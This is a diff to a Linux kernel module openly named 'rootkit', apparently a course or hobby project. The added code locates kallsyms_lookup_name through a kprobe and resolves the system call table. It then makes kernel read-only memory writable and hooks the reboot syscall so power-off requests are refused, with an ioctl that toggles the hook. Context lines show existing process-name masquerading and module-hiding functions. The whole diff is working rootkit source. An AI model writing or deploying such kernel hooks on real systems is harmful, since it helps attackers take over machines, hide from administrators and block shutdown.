@@ -9,12 +9,16 @@
 #include <linux/uaccess.h>
 #include <linux/cdev.h>
 #include <linux/hashtable.h>
+#include <linux/kprobes.h>
+#include <linux/reboot.h>
 #include <asm/syscall.h>
 #include <stdbool.h>
 
 #include "rootkit.h"
 
 #define OURMODNAME "rootkit"
+
+typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
 
 MODULE_AUTHOR("FOOBAR");
 MODULE_DESCRIPTION("FOOBAR");
@@ -23,6 +27,13 @@ MODULE_VERSION("0.1");
 
 static int major;
 struct cdev *kernel_cdev;
+
+static unsigned long start_rodata;
+static unsigned long init_begin;
+static unsigned long *sc_table;
+static void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt, phys_addr_t size, pgprot_t prot);
+
+static syscall_fn_t orig_reboot;
 
 static int rootkit_open(struct inode *inode, struct file *filp)
 {
@@ -112,6 +123,44 @@ static int masqProcNames(const struct masq_proc_req __user *req) {
     return 0;
 }
 
+asmlinkage long reboot_hook(const struct pt_regs *regs)
+{
+    if (regs->regs[2] == LINUX_REBOOT_CMD_POWER_OFF) {
+        return -EPERM;
+    }
+    return orig_reboot(regs);
+}
+
+static void updateSysCallTableAccess(bool writable)
+{
+    pgprot_t pgprot = writable ? PAGE_KERNEL : PAGE_KERNEL_RO;
+    update_mapping_prot(__pa_symbol(start_rodata), (unsigned long) start_rodata,
+            init_begin - start_rodata, pgprot);
+}
+
+static bool hooked = false;
+
+static void unhookSysCalls(void)
+{
+    updateSysCallTableAccess(true);
+
+    sc_table[__NR_reboot] = (unsigned long) orig_reboot;
+
+    updateSysCallTableAccess(false);
+    hooked = false;
+}
+
+static void hookSysCalls(void)
+{
+    updateSysCallTableAccess(true);
+
+    orig_reboot = (syscall_fn_t) sc_table[__NR_reboot];
+    sc_table[__NR_reboot] = (unsigned long) reboot_hook;
+
+    updateSysCallTableAccess(false);
+    hooked = true;
+}
+
 static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
                           unsigned long arg)
 {
@@ -121,6 +170,7 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
 
     switch (ioctl) {
     case IOCTL_MOD_HOOK:
+        if (hooked) unhookSysCalls(); else hookSysCalls();
         break;
     case IOCTL_MOD_HIDE:
         toggleVisibility();
@@ -135,6 +185,24 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
     }
 
     return ret;
+}
+
+static struct kprobe kp = {
+    .symbol_name = "kallsyms_lookup_name"
+};
+
+static void obtainSymbols(void)
+{
+    kallsyms_lookup_name_t kallsyms_lookup_name;
+
+    register_kprobe(&kp);
+    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
+    unregister_kprobe(&kp);
+
+    start_rodata = (unsigned long) kallsyms_lookup_name("__start_rodata");
+    init_begin = (unsigned long) kallsyms_lookup_name("__init_begin");
+    sc_table = (unsigned long *) kallsyms_lookup_name("sys_call_table");
+    update_mapping_prot = (void *) kallsyms_lookup_name("update_mapping_prot");
 }
 
 struct file_operations fops = {
@@ -168,12 +236,14 @@ static int __init rootkit_init(void)
         return ret;
     }
 
+    obtainSymbols();
+
     return 0;
 }
 
 static void __exit rootkit_exit(void)
 {
-    // TODO: unhook syscall
+    if (hooked) unhookSysCalls();
 
     pr_info("%s: removed\n", OURMODNAME);
     cdev_del(kernel_cdev);
